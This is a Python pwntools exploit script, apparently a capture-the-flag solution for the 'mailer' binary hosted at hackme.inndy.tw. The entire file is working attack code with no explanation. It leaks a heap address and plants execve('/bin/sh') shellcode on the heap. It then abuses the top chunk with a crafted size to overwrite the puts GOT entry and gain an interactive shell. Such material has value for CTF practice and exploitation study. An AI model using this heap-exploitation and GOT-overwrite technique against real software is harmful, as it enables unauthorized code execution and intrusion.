#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./mailer"
libcPath = ""
remoteAddr = "hackme.inndy.tw"
remotePort = 7721

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process(elfPath)
    libc = elf.libc

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def Write(length, title, cont):
    io.sendlineafter(": ", "1")
    io.sendlineafter(": ", str(length))
    io.sendlineafter(": ", title)
    io.sendlineafter(": ", cont)

def Dump():
    io.sendlineafter(": ", "2")

def Exit():
    io.sendlineafter(": ", "3")

if __name__ == "__main__":
    Write(8, '0' * 64 + p64(20), 'aaaa')
    Write(8, '1' * 64, 'bbbb')
    #  DEBUG([0x804875F])
    Dump()
    io.recvuntil(p32(0x59))
    heapBase = u32(io.recv(4)) - 0x8
    success("heapBase", heapBase)
    topChunk = heapBase + 0xb0
    success("topChunk", topChunk)
    Write(8, asm(shellcraft.execve("/bin/sh")), 'cccccccc' + p32(0) + p32(0xffffffff))
    scAddr = heapBase + 0xb0 + 12
    success("scAddr", scAddr)
    #  DEBUG([0x80486DB])
    Write(elf.got['puts'] - 0x8 - topChunk - 8 * 20 - 4 * 11, '3333', 'dddd')
    
    #  DEBUG([0x80486B9, 0x804875E])
    Write(8, p32(scAddr), 'eeee')
    Exit()

    io.interactive()
    io.close()

